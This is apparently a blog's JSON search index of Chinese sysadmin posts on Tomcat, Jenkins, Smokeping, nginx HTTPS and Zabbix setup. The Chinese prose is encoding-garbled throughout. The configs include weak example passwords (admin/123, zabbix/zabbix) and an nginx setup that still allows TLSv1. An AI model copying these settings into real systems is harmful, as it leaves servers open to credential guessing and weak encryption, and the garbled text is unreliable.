aliyun\u003c/name\u003e \u003curl\u003ehttp://maven.aliyun.com/nexus/content/groups/public\u003c/url\u003e \u003c/mirror\u003e ","date":"2019-06-24 22:20","objectID":"/post/488/:0:0","tags":["maven"],"title":"mavené…ç½®é˜¿é‡Œäº‘ä»“åº“åŠ é€Ÿ","uri":"/post/488/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æ‰“å¼€é¡¹ç›®ç›®å½•ä¸­çš„web.xmlæ–‡ä»¶ï¼Œå¹¶æ‰¾åˆ°\u003cauth-constraint\u003eæ‰€åœ¨ä½ç½®ï¼Œä¿®æ”¹è§’è‰²å. ä¸»è¦åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š 1.è®¤è¯ç›®å½• 2.è§’è‰²åç§° 3.è®¤è¯é…ç½® \u003csecurity-constraint\u003e \u003cweb-resource-collection\u003e \u003cweb-resource-name\u003eother\u003c/web-resource-name\u003e \u003curl-pattern\u003e/*\u003c/url-pattern\u003e \u003c/web-resource-collection\u003e \u003c!-- no security constraint --\u003e \u003cauth-constraint\u003e \u003crole-name\u003esoulchild\u003c/role-name\u003e \u003c/auth-constraint\u003e \u003c/security-constraint\u003e \u003clogin-config\u003e \u003cauth-method\u003eBASIC\u003c/auth-method\u003e \u003crealm-name\u003exxxxx\u003c/realm-name\u003e \u003c/login-config\u003e ä¿®æ”¹tomcat-users.xmlï¼Œè¦ä¸ä¸Šé¢ä¿®æ”¹çš„è§’è‰²åç§°ç›¸åŒ \u003crole rolename=\"soulchild\"/\u003e \u003cuser username=\"admin\" password=\"123\" roles=\"soulchild\"/\u003e ","date":"2019-06-23 00:41","objectID":"/post/479/:0:0","tags":["tomcat"],"title":"tomcat é…ç½®basic authè®¤è¯","uri":"/post/479/"},{"categories":["ç³»ç»ŸæœåŠ¡","devops"],"content":"æœ€æ–°waråŒ…ä¸‹è½½åœ°å€ï¼š https://mirrors.tuna.tsinghua.edu.cn/jenkins/war-stable/latest/jenkins.war å°†waråŒ…å¤åˆ¶åˆ°tomcatç«™ç‚¹ç›®å½•ï¼š cp jenkins.war /application/tomcat/webapps/ 1.æ‰“å¼€webåœ°å€ï¼š http://10.0.0.7:8080/jenkins 2.è¾“å…¥å¯†ç åç»§ç»­ï¼Œè·³è¿‡æ’ä»¶å®‰è£… 3.å®‰è£…Locale æ’ä»¶ æ‰¾åˆ°Localeæ’ä»¶å®‰è£…å³å¯ 4.é…ç½®ä¸­æ–‡ ","date":"2019-06-22 23:32","objectID":"/post/475/:0:0","tags":["tomcat"],"title":"waråŒ…æ–¹å¼éƒ¨ç½²jenkinsï¼Œå¹¶è®¾ç½®ä¸ºä¸­æ–‡","uri":"/post/475/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"è½¯ä»¶åŒ…å‡†å¤‡ï¼š apache-tomcat-8.0.27.tar.gz jdk-8u102-linux-x64.rpm rpmæ–¹å¼å®‰è£…jdk rpm -ivhÂ jdk-8u102-linux-x64.rpm äºŒè¿›åˆ¶æ–¹å¼å®‰jdk tar xf jdk-8u191-linux-x64.tar.gz mv jdk1.8.0_191 /usr/local/ ln -sv /usr/local/jdk1.8.0_191 /usr/local/jdk #è®¾ç½®ç¯å¢ƒå˜é‡ vim /etc/profile export JAVA_HOME=/usr/local/jdk export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export PATH=$JAVA_HOME/bin:$PATH å®‰è£…tomcat8 tar xf apache-tomcat-8.0.27.tar.gz -C /application/ ln -s /application/apache-tomcat-8.0.27/ /application/tomcat å¯åŠ¨tomcat /application/tomcat/bin/startup.sh tomcatç›®å½•ç»“æ„ [root@tomcat ~]# cd /application/tomcat/ [root@tomcat tomcat]# tree -L 1 . â”œâ”€â”€ bin #â†’ç”¨ä»¥å¯åŠ¨ã€å…³é—­Tomcatæˆ–è€…å…¶å®ƒåŠŸèƒ½çš„è„šæœ¬ï¼ˆ.batæ–‡ä»¶å’Œ.shæ–‡ä»¶ï¼‰ â”œâ”€â”€ conf #â†’ç”¨ä»¥é…ç½®Tomcatçš„XMLåŠDTDæ–‡ä»¶ â”œâ”€â”€ lib #â†’å­˜æ”¾webåº”ç”¨èƒ½è®¿é—®çš„JARåŒ… â”œâ”€â”€ LICENSE â”œâ”€â”€ logs #â†’Catalinaå’Œå…¶å®ƒWebåº”ç”¨ç¨‹åºçš„æ—¥å¿—æ–‡ä»¶ â”œâ”€â”€ NOTICE â”œâ”€â”€ RELEASE-NOTES â”œâ”€â”€ RUNNING.txt â”œâ”€â”€ temp #â†’ä¸´æ—¶æ–‡ä»¶ â”œâ”€â”€ webapps #â†’Webåº”ç”¨ç¨‹åºæ ¹ç›®å½• â””â”€â”€ work #â†’ç”¨ä»¥äº§ç”Ÿæœ‰JSPç¼–è¯‘å‡ºçš„Servletçš„.javaå’Œ.classæ–‡ä»¶ 7 directories, 4 files [root@tomcat tomcat]# cd webapps/ [root@tomcat webapps]# ll total 20 drwxr-xr-x 14 root root 4096 Oct 5 12:09 docs #â†’tomcatå¸®åŠ©æ–‡æ¡£ drwxr-xr-x 6 root root 4096 Oct 5 12:09 examples #â†’webåº”ç”¨å®ä¾‹ drwxr-xr-x 5 root root 4096 Oct 5 12:09 host-manager #â†’ç®¡ç† drwxr-xr-x 5 root root 4096 Oct 5 12:09 manager #â†’ç®¡ç† drwxr-xr-x 3 root root 4096 Oct 5 12:09 ROOT #â†’é»˜è®¤ç½‘ç«™æ ¹ç›®å½• ","date":"2019-06-22 22:42","objectID":"/post/470/:0:0","tags":["tomcat"],"title":"Centos 7 å®‰è£…JDK1.8ï¼ŒTomcat8","uri":"/post/470/"},{"categories":["ç›‘æ§"],"content":"å®‰è£…å‰å‡†å¤‡ 1ï¼‰å…³é—­iptablesä»¥åŠselinux 2ï¼‰æ—¶é—´åŒæ­¥ cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime ntpdate ntp1.aliyun.com ä¸‹è½½åœ°å€ï¼š fping: wget http://fping.org/dist/fping-3.10.tar.gz echoping: wget https://fossies.org/linux/misc/old/echoping-6.0.2.tar.gz smokeping: wget http://pkgs.fedoraproject.org/repo/pkgs/smokeping/smokeping-2.6.9.tar.gz/0c2361b734866dd37facf2af3f8f7144/smokeping-2.6.9.tar.gz 1ã€å®‰è£…ä¾èµ–åŒ…ï¼š yum install -y vim wget perl perl-Net-Telnet perl-Net-DNS perl-LDAP perl-libwww-perl perl-IO-Socket-SSL perl-Socket6 perl-Time-HiRes perl-ExtUtils-MakeMaker rrdtool rrdtool-perl curl httpd httpd-devel gcc make wget libxml2-devel libpng-devel glib pango pango-devel freetype freetype-devel fontconfig cairo cairo-devel libart_lgpl libart_lgpl-devel popt popt-devel libidn libidn-devel screen 2ã€è§£å‹ã€ç¼–è¯‘å®‰è£…fping tar xf fping-3.10.tar.gz cd fping-3.10 ./configure make \u0026\u0026 make install cd ~ 3ã€è§£å‹ã€ç¼–è¯‘å®‰è£…echoping tar xf echoping-6.0.2.tar.gz cd echoping-6.0.2 ./configure make \u0026\u0026 make install cd ~ 4ã€è§£å‹ã€ç¼–è¯‘å®‰è£…smokeping tar xf smokeping-2.6.9.tar.gz cd smokeping-2.6.9 ./setup/build-perl-modules.sh /usr/local/smokeping/thirdparty #å¦‚æœæœ‰failedéœ€è¦å¤šæ•²å‡ éæ­¤å‘½ä»¤ï¼Œä»¥ä¿è¯å®Œå…¨å®‰è£… ./configure --prefix=/usr/local/smokeping /usr/bin/gmake install 5ã€é…ç½® smokeping mkdir /usr/local/smokeping/htdocs/cache mkdir /usr/local/smokeping/data mkdir /usr/local/smokeping/var touch /var/log/smokeping.log chown apache:apache /usr/local/smokeping/htdocs/cache chown apache:apache /usr/local/smokeping/data chown apache:apache /usr/local/smokeping/var chown apache:apache /var/log/smokeping.log chmod 600 /usr/local/smokeping/etc/smokeping_secrets.dist cd /usr/local/smokeping/htdocs cp smokeping.fcgi.dist smokeping.fcgi cd /usr/local/smokeping/etc cp config.dist config 6ã€æ›´æ”¹é…ç½®æ–‡ä»¶ vim /usr/local/smokeping/etc/config ä¸»è¦ä¿®æ”¹å¦‚ä¸‹å†…å®¹ï¼š cgiurl = http://127.0.0.1/smokeping.cgi imgcache = /usr/local/smokeping/htdocs/cache *** Database *** #step = 300 step = 60 #æ­¤å¤„å»ºè®®æ”¹ä¸º 60 ï¼Œ ä¸€åˆ†é’Ÿé‡‡é›†ä¸€æ¬¡æ•°æ® pings = 20 108è¡Œçš„fpingè·¯å¾„ä¿®æ”¹ä¸º binary = /usr/local/sbin/fping 7ã€ç¼–è¾‘apacheé…ç½®æ–‡ä»¶ vim /etc/httpd/conf/httpd.conf åœ¨DocumentRoot â€œ/var/www/htmlâ€ è¿™ä¸€è¡Œ(åœ¨292è¡Œå·¦å³)ä¹‹ä¸‹æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š Alias /cache \"/usr/local/smokeping/htdocs/cache\" Alias /cropper \"/usr/local/smokeping/htdocs/cropper\" Alias /smokeping \"/usr/local/smokeping/htdocs\" \u003cDirectory \"/usr/local/smokeping/htdocs\"\u003e AllowOverride None AddHandler cgi-script .fcgi .cgi Options ExecCGI \u003cIfModule dir_module\u003e DirectoryIndex smokeping.fcgi \u003c/IfModule\u003e Order allow,deny Allow from all \u003c/Directory\u003e 8ã€å›¾åƒæµè§ˆç•Œé¢çš„ä¸­æ–‡æ”¯æŒ å®‰è£…å­—ä½“ yum -y install wqy-zenhei-fonts.noarch ç¼–è¾‘smokepingçš„é…ç½®æ–‡ä»¶ vim /usr/local/smokeping/etc/config ç¬¬49è¡Œæ·»åŠ  charset = utf-8 #æ·»åŠ æ­¤è¡Œ 9ã€åœ¨Webé¡µé¢å¢åŠ éªŒè¯ç”¨æˆ·åå’Œå¯†ç  vim /etc/httpd/conf/httpd.conf åœ¨\u003cDirectory â€œ/usr/local/smokeping/htdocsâ€\u003eä¸‹å¢åŠ ä»¥ä¸‹å†…å®¹ AuthName \"Smokeping\" AuthType Basic AuthUserFile /usr/local/smokeping/htdocs/htpasswd Require valid-user è®¾ç½®è´¦å·å¯†ç  htpasswd -c /usr/local/smokeping/htdocs/htpasswd admin 10ã€æ·»åŠ ç›‘æ§èŠ‚ç‚¹ vim /usr/local/smokeping/etc/config ############################################################ +dianxinÂ #ä¸€çº§èœå• menu = ä¸­å›½ç”µä¿¡Â #ä¸€çº§èœå•æ˜¾ç¤ºåç§° title = ä¸­å›½ç”µä¿¡Â #é¡µé¢å†…æ ‡é¢˜ ++beijingdianxinÂ # èŠ‚ç‚¹åç§°ï¼ˆéä¸­æ–‡ï¼‰ menu = åŒ—äº¬ç”µä¿¡Â # å·¦ä¾§é€‰é¡¹æ˜¾ç¤ºåç§° title = åŒ—äº¬å¸‚ç”µä¿¡ 202.97.0.1Â # èŠ‚ç‚¹é¡µé¢é¡¶éƒ¨æ˜¾ç¤ºåç§° host = 202.97.0.1Â #ä¸»æœºIP ###################################################### Â  11ã€ç¼–å†™å¯åŠ¨è„šæœ¬ vim /etc/init.d/smokeping ############################################################ #!/bin/bash # # chkconfig: 2345 80 05 # Description: Smokeping init.d script # Write by : linux-Leon_xiedi # Get function from functions library . /etc/init.d/functions # Start the service Smokeping function start() { echo -n \"Starting Smokeping: \" /usr/local/smokeping/bin/smokeping \u003e/dev/null 2\u003e\u00261 ### Create the lock file ### touch /var/lock/subsys/smokeping success $\"Smokeping startup\" echo } # Restart the service Smokeping function stop() { echo -n \"Stopping Smokeping: \" kill -9 `ps ax |grep \"/usr/local/smokeping/bin/smokeping\" | grep -v grep | awk '{ print $1 }'` \u003e/dev/null 2\u003e\u00261 ### Now, delete the lock file ### rm -f /var/lock/subsys/smokeping success $\"Smokeping shutdown\" echo } #Show status about Smokep","date":"2019-06-21 22:00","objectID":"/post/462/:0:0","tags":["ç›‘æ§"],"title":"Centos6 æ­å»ºsmokeping","uri":"/post/462/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"1.ç”³è¯·è¯ä¹¦ ç•¥ 2.ä¸‹è½½ä¸Šä¼ è¯ä¹¦ 1_www.domain.com_bundle.crt; 2_www.domain.com.key; å°†è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨nginx/conf/sslç›®å½•ä¸­ 3.nginxé…ç½® serverå­—æ®µä¸­é…ç½®https listen 443; server_name www.domain.com; ## ssl on; root /var/www/www.domain.com; ## index index.php index.html index.htm; ssl_certificate ssl/1_www.domain.com_bundle.crt; ## ssl_certificate_key ssl/2_www.domain.com.key; ## ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; é…ç½®80è·³è½¬443 server { listen 80; server_name www.domain.com; #å¡«å†™ç»‘å®šè¯ä¹¦çš„åŸŸå rewrite ^(.*)$ https://$host$1 permanent; #æŠŠhttpçš„åŸŸåè¯·æ±‚è½¬æˆhttps } é…ç½®å®Œåï¼Œé‡å¯æœåŠ¡å³å¯ã€‚ ","date":"2019-06-18 22:43","objectID":"/post/450/:0:0","tags":["https"],"title":"nginxé…ç½®https(SSL)è®¿é—®","uri":"/post/450/"},{"categories":["ç›‘æ§"],"content":"ä¸‹è½½å®‰è£…ï¼š wgetÂ https://dl.grafana.com/oss/release/grafana-6.2.2-1.x86_64.rpmÂ yumÂ localinstallÂ grafana-6.2.2-1.x86_64.rpmÂ systemctlÂ startÂ grafana-server Â  æ‰“å¼€webï¼š http://10.0.0.62:3000/ é»˜è®¤ç”¨æˆ·åå¯†ç ï¼šadmin é¦–æ¬¡ç™»é™†éœ€è¦ä¿®æ”¹ å®‰è£…zabbixæ’ä»¶ï¼š å®‰è£…æ’ä»¶æ›´å¤šå†…å®¹å¯å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼š https://grafana.com/docs/plugins/installation/ å®‰è£…ï¼š grafana-cli plugins install alexanderzobnin-zabbix-app service grafana-server restart å¯ç”¨æ’ä»¶ï¼šè¿›å…¥ä¹‹åç‚¹å‡»enable æ·»åŠ æ•°æ®æºï¼š ç‚¹å‡»addåé€‰æ‹©zabbix http://10.0.0.62/zabbix/api_jsonrpc.php å¡«å†™å®Œæˆåï¼Œç‚¹å‡»Save \u0026 Test ä¿å­˜åï¼Œç‚¹å‡»Dashboardsï¼Œå¯¼å…¥å›¾å½¢æ¨¡æ¿ å±•ç¤ºå›¾å½¢ï¼š å±•ç¤ºåï¼Œå¯ä»¥é€‰æ‹©ç›¸åº”çš„æœåŠ¡å™¨è¿›è¡ŒæŸ¥çœ‹ æ›´æ·±å…¥è¯·å‚è€ƒå…¶ä»–æ–‡ç« ï¼š https://www.cnblogs.com/kevingrace/p/7108060.html ","date":"2019-06-14 00:03","objectID":"/post/442/:0:0","tags":["zabbix","grafana"],"title":"zabbixä¹‹ä½¿ç”¨grafanaå±•ç¤ºå›¾å½¢","uri":"/post/442/"},{"categories":["ç›‘æ§"],"content":"zabbixç›‘æ§èŒƒå›´ï¼š 1ï¼šç›‘æ§ç‰©ç†ç¡¬ä»¶çš„ç¯å¢ƒï¼ˆcpuçš„æ¸©åº¦ï¼Œä¸»æ¿çš„æ¸©åº¦ï¼Œé£æ‰‡çš„è½¬é€Ÿï¼Œç¡¬ç›˜çš„ç›‘æ§çŠ¶æ€ï¼‰ipmièŠ¯ç‰‡ï¼Œè‡ªå®šä¹‰ç›‘æ§ 2ï¼šç›‘æ§æ“ä½œç³»ç»Ÿï¼ˆcpuè´Ÿè½½ï¼Œå†…å­˜ï¼Œç¡¬ç›˜ï¼Œç½‘å¡æµé‡ï¼Œè¿›ç¨‹ï¼Œå®‰å…¨ç›‘æ§ï¼‰zabbix linux 3ï¼šåº”ç”¨ç¨‹åºç›‘æ§ï¼ˆnginxï¼Œphp-fpmï¼Œnfsï¼Œmysqlï¼Œredisï¼Œrsyncï¼‰ä¸‹è½½ç½‘ä¸Šæ¨¡æ¿ï¼Œç²¾ç®€ä¼˜åŒ– 4ï¼šä¸šåŠ¡ç›‘æ§ï¼ˆç½‘é¡µhttpçŠ¶æ€ç ï¼Œæ¯å¤©æ´»è·ƒç”¨æˆ·çš„ç›‘æ§pvï¼Œuvï¼Œipï¼Œæ¯å¤©çš„è®¢å•é‡dbaï¼Œcdnæµé‡çš„ç›‘æ§ç­‰ã€‚ã€‚ã€‚ï¼‰ ","date":"2019-06-13 23:23","objectID":"/post/439/:0:0","tags":[],"title":"zabbixä½¿ç”¨","uri":"/post/439/"},{"categories":["ç›‘æ§"],"content":"å®˜æ–¹å‚è€ƒæ–‡æ¡£ï¼šhttps://www.zabbix.com/documentation/4.0/zh/manual/appendix/macros/supported_by_location æ•…éšœï¼š æ ‡é¢˜ï¼š {HOST.NAME},å‘ç°å¼‚å¸¸ å†…å®¹ï¼š å‘Šè­¦æ—¶é—´: {EVENT.DATE} {EVENT.TIME} å‘Šè­¦è®¾å¤‡IP: {HOSTNAME1} å‘Šè­¦ä¿¡æ¯: {TRIGGER.NAME} å½“å‰çŠ¶æ€: {TRIGGER.STATUS}ï¼š{ITEM.VALUE1} ########################################## æ¢å¤ï¼š æ ‡é¢˜ï¼š {HOST.NAME},æ¢å¤ æŠ¥è­¦å†…å®¹ï¼š å‘Šè­¦æ—¶é—´: {EVENT.DATE} {EVENT.TIME} å‘Šè­¦è®¾å¤‡IP: {HOSTNAME1} å‘Šè­¦ä¿¡æ¯: {TRIGGER.NAME} å½“å‰çŠ¶æ€: {TRIGGER.STATUS}:{ITEM.VALUE1} ","date":"2019-06-13 23:17","objectID":"/post/437/:0:0","tags":["zabbix"],"title":"zabbixè‡ªå®šä¹‰æŠ¥è­¦å†…å®¹","uri":"/post/437/"},{"categories":["ç›‘æ§"],"content":"Webé…ç½®ï¼š 1.é…ç½®é‚®ä»¶æœåŠ¡å™¨ï¼ˆå¦‚æœæ˜¯QQé‚®ç®±åˆ™éœ€è¦é€‰ä¸­SSL/TLSï¼Œå‹¾é€‰SSLéªŒè¯å¯¹ç«¯å’ŒSSLéªŒè¯ä¸»æœºï¼‰ 2.é…ç½®æ¥æ”¶æŠ¥è­¦é‚®ä»¶åœ°å€ 3.é…ç½®åŠ¨ä½œ æ­¥éª¤2ä¸­é…ç½®çš„ä¸ºç®¡ç†å‘˜ç”¨æˆ·çš„æ”¶ä»¶äººåœ°å€ï¼Œé»˜è®¤åŠ¨ä½œå‘é€åŒ…å«æ­¤ç»„ï¼Œæ‰€ä»¥å¯ä»¥ä¸ç”¨ä¿®æ”¹åŠ¨ä½œï¼Œæœ‰å…¶ä»–éœ€è¦å¯ä»¥åˆ›å»ºä¸€æ¡ã€‚è¿™é‡Œç›´æ¥å¯ç”¨å°±å¯ä»¥äº†ã€‚ 4.æµ‹è¯•æŠ¥è­¦ æŠ¥è­¦å†…å®¹å¯ä»¥åœ¨åŠ¨ä½œä¸­ä¿®æ”¹ã€‚ ","date":"2019-06-13 23:04","objectID":"/post/433/:0:0","tags":["zabbix"],"title":"zabbixå†…ç½®é‚®ä»¶æŠ¥è­¦","uri":"/post/433/"},{"categories":["ç›‘æ§"],"content":"ç”¨æˆ·ç™»å½•æ•°é‡ä¸¾ä¾‹ï¼š Â  ä¾èµ–å…³ç³»ï¼š Â  è§¦å‘å™¨AÂ ç›‘æ§æ•°æ®åº“çŠ¶æ€ è§¦å‘å™¨BÂ ç›‘æ§webçŠ¶æ€ç  200 è¿™ç§æƒ…å†µå½“æ•°æ®åº“å‡ºç°å¼‚å¸¸æ—¶ï¼Œä¸¤ä¸ªæŠ¥è­¦éƒ½ä¼šè§¦å‘ï¼Œé€ æˆä¸å¿…è¦çš„æŠ¥è­¦ æ­¤æ—¶åœ¨è§¦å‘å™¨Bä¸­è®¾ç½®ä¾èµ–è§¦å‘å™¨A å°±åªæœ‰åœ¨è§¦å‘å™¨Aæ­£å¸¸æ—¶ï¼Œè§¦å‘å™¨Bæ‰ä¼šæŠ¥è­¦ å½“è§¦å‘å™¨AæŠ¥è­¦ï¼Œè§¦å‘å™¨Båˆ™ä¸ä¼šæŠ¥è­¦ ","date":"2019-06-10 23:00","objectID":"/post/429/:0:0","tags":["zabbix"],"title":"zabbixè§¦å‘å™¨å’Œä¾èµ–å…³ç³»ç®€å•è¯´æ˜","uri":"/post/429/"},{"categories":["ç›‘æ§"],"content":"agentç«¯é…ç½® [*]ç”¨æ¥æ¥æ”¶å‚æ•°,ç”¨$å¯ä»¥è°ƒç”¨ï¼Œå‚æ•°ä¸€$1,å‚æ•°äºŒ$2,å‚æ•°ä¸‰$3....ä»¥æ­¤ç±»æ¨ è‡ªå®šä¹‰keyï¼š UserParameter=tps[*],sh /server/scripts/tps.sh $1 cat /server/scripts/tps.sh #!/bin/bash iostat | awk '/^'$1'/{print $2}' æµ‹è¯•è·å–sdaï¼š zabbix_get -s 172.16.1.7 -k tps[sda] 0.94 å¤§æ¦‚æ‰§è¡Œè¿‡ç¨‹ï¼š tps[sda] â€”â€”\u003e$1=sda â€”â€“\u003esh /server/scripts/tps.sh sda â€”â€“\u003eiostat | awk â€˜/^sda/{print $2}â€™ è¿™æ ·ä¼ å‚çš„å½¢å¼å¯ä»¥æé«˜çµæ´»æ€§ã€‚ webé…ç½® Â  ","date":"2019-06-09 23:50","objectID":"/post/418/:0:0","tags":["zabbix"],"title":"zabbixä¼ å‚å½¢å¼çš„è‡ªå®šä¹‰ç›‘æ§é¡¹","uri":"/post/418/"},{"categories":["ç›‘æ§"],"content":"/usr/share/zabbix/assets/fontsæ–‡ä»¶å¤¹ä¸­å‘ç°é‡Œé¢æ²¡æœ‰å­—ä½“ï¼Œä»windowsæ‹·è´ä¸€ä¸ªåˆ°æŒ‡å®šç›®å½•ä¸­å³å¯ï¼Œéœ€è¦æ”¹å [root@zabbix-server fonts]# pwd /usr/share/zabbix/assets/fonts [root@zabbix-server fonts]# ls graphfont.ttf ","date":"2019-06-09 23:22","objectID":"/post/420/:0:0","tags":["zabbix"],"title":"zabbix4.0å›¾å½¢ä¹±ç æˆ–ä¸æ˜¾ç¤ºæ–‡å­—","uri":"/post/420/"},{"categories":["ç›‘æ§"],"content":"ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥å®ç° ä¸€ä¸ªæ˜¯åœ¨zabbix_agentd.confä¸­ç›´æ¥å†™ å¦ä¸€ä¸ªæ˜¯å†™åœ¨zabbix_agentd.dç›®å½•ä¸‹*.conf,å‰ææ˜¯é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨include Include=/etc/zabbix/zabbix_agentd.d/*.conf æ ¼å¼å¦‚ä¸‹ï¼š UserParameter=key,xxxxxxxxxx xxxéƒ¨åˆ†å¯ä»¥æ˜¯ç›´æ¥å–å€¼çš„å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬æ‰§è¡Œï¼Œé˜²æ­¢ä¼ å‚å˜é‡å†²çª ç›‘æ§ç¡¬ç›˜çš„tpså€¼----ï¼ˆagentç«¯é…ç½®ï¼‰ tpsï¼šæ¯ç§’ç¡¬ç›˜è¯»å†™æ¬¡æ•° å®‰è£…æŸ¥è¯¢å·¥å…· yum install -y sysstat å‘½ä»¤è¡Œå–å€¼æµ‹è¯• iostat | awk â€˜/^sda/{print $2}â€™ æ·»åŠ è‡ªå®šä¹‰ç›‘æ§(sda_tpsä¸ºkeyå€¼ï¼Œéœ€è¦è‡ªå·±å–åï¼Œä¸èƒ½é‡å¤) vim /etc/zabbix/zabbix_agentd.d/sda_tps.conf UserParameter=sda_tps,iostat | awk â€˜/^sda/{print $2}â€™ é‡å¯æœåŠ¡ systemctl restart zabbix-agent.service åœ¨zabbix-serverä¸Šæ‰‹åŠ¨å–å€¼ï¼ˆéœ€è¦å®‰è£…zabbix-getï¼Œå–å€¼ä½¿ç”¨çš„æ˜¯zabbixç”¨æˆ·ï¼Œéœ€è¦æ³¨æ„ç”¨æˆ·æƒé™é—®é¢˜ï¼‰ zabbix_get -s 172.16.1.7 -k sda_tps 1.82 webé…ç½® 1.æ·»åŠ ç›‘æ§é¡¹ åç§°å¯ä»¥éšä¾¿å†™ï¼Œé”®å€¼å°±æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„keyå€¼ æ·»åŠ å®Œæˆåï¼ŒæŸ¥çœ‹æœ€æ–°æ•°æ® ","date":"2019-06-09 21:30","objectID":"/post/412/:0:0","tags":["zabbix"],"title":"zabbixæ·»åŠ è‡ªå®šä¹‰ç›‘æ§é¡¹","uri":"/post/412/"},{"categories":["ç›‘æ§"],"content":"æœåŠ¡ç«¯é…ç½® zabbix-agentåŒ…ä¸‹è½½åœ°å€ï¼šhttps://repo.zabbix.com/zabbix/4.0/rhel/7/x86_64/ é€‰æ‹©å’Œè‡ªå·±ç¯å¢ƒåŒ¹é…çš„åŒ…ï¼š rpm -qa | grep zabbix-server zabbix-server-mysql-4.0.8-1.el7.x86_64 å®‰è£…zabbix-agent,æˆ‘è¿™è¾¹æ˜¯4.0.8çš„ rpm -ivh https://repo.zabbix.com/zabbix/4.0/rhel/7/x86_64/zabbix-agent-4.0.8-1.el7.x86_64.rpm ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼ˆæŒ‡å®šzabbix-serverçš„åœ°å€ï¼‰ vim /etc/zabbix/zabbix_agentd.conf Server=172.16.1.62 é‡å¯æœåŠ¡å’Œè®¾ç½®å¼€æœºè‡ªå¯ systemctl restart zabbix-agent.service systemctl enable zabbix-agent.service webé…ç½® åˆ›å»ºä¸»æœº æ·»åŠ linuxæ¨¡æ¿ ","date":"2019-06-09 20:46","objectID":"/post/405/:0:0","tags":["zabbix"],"title":"zabbixé€šè¿‡agentç›‘æ§ä¸»æœº","uri":"/post/405/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"buffer(ç¼“å†²)ï¼šåœ¨å†…å­˜ä¸­å­˜å…¥ä¸€å®šé‡çš„æ•°æ®ä¸€æ¬¡æ€§å†™å…¥åˆ°ç£ç›˜ï¼Œå‡å°‘ç£ç›˜å†™å…¥æ¬¡æ•° cache(ç¼“å­˜)ï¼šå†…å­˜çš„é€Ÿåº¦æ¯”ç¡¬ç›˜çš„é€Ÿåº¦å¿«å¾ˆå¤šçš„ï¼Œåœ¨å†…å­˜ä¸­ç¼“å­˜ä¸‹ä¸€äº›æ•°æ®ï¼Œä¸‹æ¬¡ä½¿ç”¨è¯»å–çš„æ—¶å€™ä¼šæé«˜é€Ÿåº¦ ","date":"2019-06-04 15:54","objectID":"/post/402/:0:0","tags":[],"title":"bufferå’Œcacheçš„åŒºåˆ«","uri":"/post/402/"},{"categories":["ç›‘æ§"],"content":"1.é…ç½®zabbixæº rpm -ivh https://mirrors.tuna.tsinghua.edu.cn/zabbix/zabbix/4.0/rhel/7/x86_64/zabbix-release-4.0-1.el7.noarch.rpm ä¿®æ”¹ä¸ºæ¸…åå¤§å­¦é•œåƒæº sed -i â€™s#repo.zabbix.com#mirrors.tuna.tsinghua.edu.cn/zabbix#gâ€™ /etc/yum.repos.d/zabbix.repo 2.å®‰è£…mysqlç‰ˆzabbix yum install -y zabbix-server-mysql zabbix-web-mysql 3.å®‰è£…é…ç½®æ•°æ®åº“ # å®‰è£…æ•°æ®åº“ yum install -y mariadb-server è®¾ç½®å¼€æœºè‡ªå¯å’Œå¯åŠ¨æ•°æ®åº“ systemctl enable mariadb systemctl start mariadb å®‰å…¨åˆå§‹åŒ– å¯å‚è€ƒhttp://www.soulchild.cn/380.html mysql_secure_installation åˆ›å»ºzabbixåº“ create database zabbix character set utf8 collate utf8_bin; åˆ›å»ºå’Œæˆæƒzabbixç”¨æˆ· grant all privileges on zabbix.* to zabbix@localhost identified by â€˜zabbixâ€™; #å¯¼å…¥zabbixåˆå§‹æ•°æ® zcat /usr/share/doc/zabbix-server-mysql-4.0.8/create.sql.gz | mysql -uroot -p zabbix 4.é…ç½®zabbix-server # ä¿®æ”¹ä¸ºå¦‚ä¸‹ä¿¡æ¯ï¼š vim /etc/zabbix/zabbix_server.conf DBHost=localhost DBName=zabbix DBUser=zabbix DBPassword=zabbix å¯åŠ¨zabbix-serverå’Œè®¾ç½®å¼€æœºè‡ªå¯ systemctl enable zabbix-server.service systemctl start zabbix-server.service 5.é…ç½®zabbix-web # ä¿®æ”¹apacheé…ç½®æ–‡ä»¶ï¼ˆç¬¬20è¡Œï¼‰ vim /etc/httpd/conf.d/zabbix.conf php_value date.timezone Asia/Shanghai å¯åŠ¨apache systemctl start httpd ä¿®æ”¹ç›®å½•æƒé™ chown apache.apache -R /usr/share/zabbix/assets/ æ‰“å¼€webï¼ŒæŒ‰ç…§æç¤ºå¡«å†™ä¸‹ä¸€æ­¥å³å¯ http://10.0.0.62/zabbix/ é»˜è®¤ç”¨æˆ·åï¼šAdmin é»˜è®¤Â å¯†ç ï¼šzabbix ","date":"2019-06-03 23:04","objectID":"/post/395/:0:0","tags":["zabbix"],"title":"centos7 yumå®‰è£…zabbix4.0","uri":"/post/395/"},{"categories":["ç›‘æ§"],"content":"percona-zabbixæ’ä»¶ä¸‹è½½åœ°å€ï¼šhttps://www.percona.com/downloads/ æ³¨æ„ï¼šä½¿ç”¨perconaéœ€è¦å®‰è£…phpå’Œphp-mysql å®‰è£…ï¼š rpm -ivhÂ percona-zabbix-templates-1.1.8-1.noarch.rpm å®‰è£…å®Œåæ³¨æ„ä¸¤ä¸ªç›®å½•ï¼š Scripts are installed to /var/lib/zabbix/percona/scriptsÂ # è„šæœ¬ç›®å½• Templates are installed to /var/lib/zabbix/percona/templatesÂ # 